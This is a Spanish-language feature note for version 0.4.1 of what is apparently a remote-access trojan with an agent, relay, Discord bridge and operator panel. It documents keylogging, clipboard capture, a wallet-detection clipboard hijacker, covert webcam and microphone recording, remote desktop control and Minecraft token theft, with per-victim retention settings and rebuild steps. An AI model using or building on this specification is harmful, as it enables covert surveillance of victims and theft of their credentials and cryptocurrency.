# Datos en vivo del panel

Documento de los eventos y tareas añadidos en 0.4.1. Todo es aditivo: los
agentes anteriores siguen operando y el panel no pinta lo que la versión no
soporta.

## Eventos agente → relay

| Evento | Datos | Límite | Persistencia |
|---|---|---|---|
| `keystroke` | `text`, `process?`, `title?` | 512 chars / 256 KB de frame | `TimelineEntry` + evento |
| `clipboard` | `content`, `kind?`, `process?`, `title?` | 256 KB / 256 KB de frame | `TimelineEntry` + `ClipboardEntry` |

`legacy` admite 256 KB. El relay recorta a esos límites y guarda el valor
completo en base de datos; Discord solo recibe la línea legacy corta.

Flags del agente: `keylogger.timeline` y `clipboard.timeline` (por defecto on,
`false` los apaga). El keylogger debe estar activo para `keystroke` y el
clipper para `clipboard` genérico. Los módulos nuevos se apagan con
`modules.desktop`, `modules.webcam`, `modules.mic` y `modules.minecraft`
(`false`); por defecto están on.

## Wallet

`wallet_detected` acepta `name`, `pid`, `title?`, `url?`. Se deduplica por
`provider + window` en `WalletDetection`; `wallet_closed` acepta `pid?` y
`title?`. El bridge de Discord publica `event.new` y `wallet.detected` para
estos mensajes, igual que el socket.

La acción de sustitución usa `clip_set` (`text`, máximo 128 chars) y solo se
ofrece con agente 0.4.1 y socket vivo.

## Tareas nuevas

| Tarea | Parámetros | Notas |
|---|---|---|
| `webcam:snapshot` | `device?`, `quality` 20–90 | JPEG en `result.data` |
| `webcam:stream` | `device?`, `quality`, `fps` 1–15, `max_frames` 1–120 | ráfaga de frames; cancelar mata ffmpeg |
| `webcam:devices` | — | lista de dispositivos |
| `mic:record` | `seconds` 1–60, `device?` | opus/webm por segmentos de 3 s |
| `desktop:frame` | `quality`, `scale`, `screen` | un fotograma JPEG |
| `desktop:screens` | — | monitores y resolución |
| `input:mouse` | `action`, `x`, `y`, `delta?` | coordenadas 0–10000 |
| `input:key` | `action`, `key`/`vk`, `modifiers?` | — |
| `input:batch` | `events` 1–64 | `m`/`c`/`r`/`w`/`k`; agrupa gestos |
| `clipboard:get` | — | contenido truncado a 64 KB |
| `clip_set` | `text` | copia en la víctima |
| `minecraft:token` | — | cuentas de launcher, token sensible |

Todas requieren agente **0.4.1** salvo `webcam`/`mic` antiguos. El relay
responde `agent_old` y el panel deshabilita el control.

## Variables del relay

- `TIMELINE_RETENTION_DAYS` (14 por defecto)
- `TIMELINE_MAX_PER_VICTIM` (5000 mínimo)
- El buffer circular en memoria es de 5000 entradas por víctima.

## Límites y seguridad

- Frame máximo 256 KB; resultado de tarea 4 MB.
- El token de Minecraft no va al embed de Discord: se queda en el resultado y
  en la tarjeta, marcado como sensible.
- `keystroke` y `clipboard` pueden contener secretos: la retención del timeline
  es independiente de la bóveda y se purga.

## Recompilar

- **JAR del agente**: eventos nuevos, tareas nuevas y flags.
- **Relay**: esquemas, rutas y migración `20261111001000_timeline_wallets`.
- **Panel**: componentes de timeline, wallets, webcam, micrófono, escritorio y
  Minecraft.

## Límites conocidos

- El escritorio es fotograma a fotograma sobre el canal actual, no WebRTC.
- El micrófono concatena en el agente, no en el relay.
- El token refrescado no se escribe de vuelta al launcher.
- `Alt+Tab` y atajos globales no se capturan fuera del foco del escritorio.
